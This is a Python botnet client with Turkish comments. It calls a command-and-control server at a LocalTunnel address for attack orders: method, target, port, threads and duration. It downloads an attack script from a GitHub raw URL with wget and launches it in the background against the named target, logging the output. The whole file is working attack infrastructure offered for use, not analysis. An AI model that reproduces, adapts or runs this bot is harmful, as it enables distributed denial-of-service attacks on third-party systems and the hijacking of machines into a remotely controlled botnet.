#!/usr/bin/env python3
import os
import time
import requests
import subprocess

# --- AYARLAR ---
# Senin yeni Beyin (LocalTunnel) adresin buraya gömüldü
MASTER_URL = "https://social-words-allow.loca.lt" 
ZOMBI_AD = f"Zombi-{os.uname()[1]}"

def komut_dinle():
    print(f"🚀 {ZOMBI_AD} orduda göreve hazır!")
    print(f"📡 Beyin Bağlantısı: {MASTER_URL}")
    
    while True:
        try:
            # LocalTunnel uyarı sayfasını aşmak için gerekli headerlar
            headers = {
                'bypass-tunnel-reminder': 'true',
                'User-Agent': 'Zombi-Commander-V2'
            }
            
            # Beyin'den (Panelden) gelen JSON verisini çek
            response = requests.get(f"{MASTER_URL}/get_command", headers=headers, timeout=15)
            
            if response.status_code == 200:
                data = response.json()
                
                method = data.get("method")
                target = data.get("target")
                port = data.get("port")
                t = data.get("threads") # Panelden gelen thread sayısı
                s = data.get("duration")

                if method and target:
                    # Eğer panelden thread gelmezse güvenlik için 100 kullanır
                    thread_sayisi = t if t else 100
                    
                    print(f"\n[!] EMİR ALINDI: {method.upper()} -> {target}:{port}")
                    print(f"🌪️ Thread: {thread_sayisi} | 🕒 Süre: {s}s")

                    # Attack.py'nin orada olduğundan emin ol, yoksa indir
                    if not os.path.exists("attack.py"):
                        os.system("wget -O attack.py https://raw.githubusercontent.com/HAYALETBEY437/ordu/main/attack.py")

                    # Komutu senin istediğin formatta hazırlar: method target port thread süre
                    attack_cmd = [
                        "python3", "attack.py", 
                        str(method), str(target), str(port), 
                        str(thread_sayisi), str(s)
                    ]
                    
                    # Arka planda ateşle ve logları kaydet
                    with open("attack.log", "a") as log_file:
                        subprocess.Popen(attack_cmd, stdout=log_file, stderr=log_file)
                    
                    print(f"✅ Mermiler Havada! (Detaylar attack.log içinde)")

            # 5 saniyede bir yeni emir kontrolü yap
            time.sleep(5)
            
        except requests.exceptions.ConnectionError:
            print("⚠️ Beyin'e ulaşılamıyor, link patlamış olabilir...")
            time.sleep(10)
        except Exception as e:
            print(f"⚠️ Hata oluştu: {e}")
            time.sleep(5)

if __name__ == "__main__":
    # Gerekli izinleri ver
    os.system("chmod +x attack.py slave.py")
    komut_dinle()
